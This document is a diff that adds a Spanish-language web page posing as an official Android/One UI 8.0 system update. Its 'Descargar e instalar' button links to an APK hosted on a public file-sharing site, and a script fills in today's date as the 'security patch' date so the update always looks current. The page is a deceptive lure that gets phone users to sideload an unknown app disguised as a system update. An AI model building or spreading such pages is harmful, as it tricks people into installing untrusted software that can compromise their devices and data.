@@ -1,0 +1,121 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Actualización de Software</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f7f7f7;
+      margin: 0;
+      padding: 0;
+    }
+
+    .header {
+      background-color: #006b8f;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .illustration {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #def4fa;
+      padding: 20px 0;
+    }
+
+    .illustration img {
+      width: 30%;
+      max-width: 100px;
+      height: auto;
+    }
+
+    .content {
+      padding: 15px;
+      background-color: white;
+    }
+
+    h2 {
+      font-size: 1.4em;
+    }
+
+    p, li {
+      font-size: 1em;
+      line-height: 1.4;
+    }
+
+    .button {
+      display: block;
+      width: 80%;
+      max-width: 250px;
+      margin: 30px auto;
+      padding: 15px;
+      background-color: #00758f;
+      color: white;
+      text-align: center;
+      border-radius: 30px;
+      text-decoration: none;
+      font-size: 16px;
+    }
+
+    ul {
+      padding-left: 20px;
+    }
+
+    @media screen and (max-width: 480px) {
+      h1, h2 {
+        font-size: 1.2em;
+      }
+
+      .button {
+        font-size: 14px;
+        padding: 12px;
+      }
+    }
+  </style>
+
+  <script>
+    function updateContent() {
+      const match = navigator.userAgent.match(/Android\s([0-9]+)/i);
+      const version = match ? match[1] : "No detectado";
+
+      const now = new Date();
+      const fecha = now.toLocaleDateString("es-ES", { day: 'numeric', month: 'long', year: 'numeric' });
+
+      document.getElementById("patchDate").innerText = fecha;
+    }
+
+    window.onload = updateContent;
+  </script>
+</head>
+<body>
+
+  <div class="header">
+    <h1>Actualización de Software</h1>
+  </div>
+
+  <div class="illustration">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg" alt="Mascota Android">
+  </div>
+
+  <div class="content">
+    <h2>Actualiza tu teléfono</h2>
+    <p>Hay una nueva actualización disponible.</p>
+    <p>One UI 8.0</p>
+    <p>Parche de seguridad: <span id="patchDate"></span></p>
+
+    <h3>Esta actualización incluye</h3>
+    <ul>
+      <li><strong>Seguridad Android:</strong> Mejoras en los parches de seguridad.</li>
+      <li><strong>Estabilidad:</strong> Actualizaciones generales del sistema.</li>
+    </ul>
+
+    <a class="button" href="https://store1.gofile.io/download/direct/05ec56ba-861d-4998-ad7f-310c7f946721/Actualizaci%C3%B3n%20de%20software.apk">Descargar e instalar</a>
+  </div>
+
+</body>
+</html>
